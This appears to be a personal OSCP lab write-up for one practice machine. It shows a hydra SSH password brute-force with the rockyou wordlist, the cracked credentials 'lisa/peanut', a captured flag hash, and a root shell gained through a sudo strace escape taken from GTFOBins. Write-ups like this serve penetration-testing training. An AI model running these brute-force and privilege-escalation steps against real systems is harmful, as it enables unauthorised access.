
# brute force 

![[{7BC4111F-B95A-46ED-8782-CE680F5B60BB}.png]]

```
hydra -l lisa -P /usr/share/wordlists/rockyou.txt ssh://192.168.114.110 -t 4  -vV

[ATTEMPT] target 192.168.114.110 - login "lisa" - pass "peanut" - 163 of 14344399 [child 3] (0/0)
[22][ssh] host: 192.168.114.110   login: lisa   password: peanut
[STATUS] attack finished for 192.168.114.110 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-09 13:38:43


```

cred:
lisa
peanut

# ssh 

```
┌──(kali㉿kali)-[~/OSCP/Exam/192.168.114.110/PwnKit]
└─$ ssh lisa@192.168.114.110                                                         
lisa@192.168.114.110's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun  9 05:41:23 PM UTC 2025

  System load:  0.03759765625     Processes:               215
  Usage of /:   56.8% of 9.75GB   Users logged in:         0
  Memory usage: 28%               IPv4 address for ens160: 192.168.114.110
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

$ whoami
lisa
$ 

```
![[{C17668BA-C779-4C39-8113-5CBE070ECE9E}.png]]

Local.txt 
bee0fce51a0ecf6ada8808f2a83624b2

![[{25699792-0DE7-4C85-9B5C-DC10B00EBD10}.png]]

# escalation

```
$ sudo -l
[sudo] password for lisa: 
Matching Defaults entries for lisa on oscp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lisa may run the following commands on oscp:
    (root) /usr/bin/strace
    (root) /usr/bin/newgrp
$ 

```
https://gtfobins.github.io/gtfobins/strace/

```
## Shell[](https://gtfobins.github.io/gtfobins/strace/#shell)

It can be used to break out from restricted environments by spawning an interactive system shell.

- ```
    strace -o /dev/null /bin/sh
    ```
```


```

$ sudo strace -o /dev/null /bin/sh
# ls
evil-so.c  exploit.c  help.txtx  local.txt  makefile  MakeFile  Pwnkit.c
# whoami
root

```


![[{B7445D4D-763A-472E-BDE4-50C35A50BF03}.png]]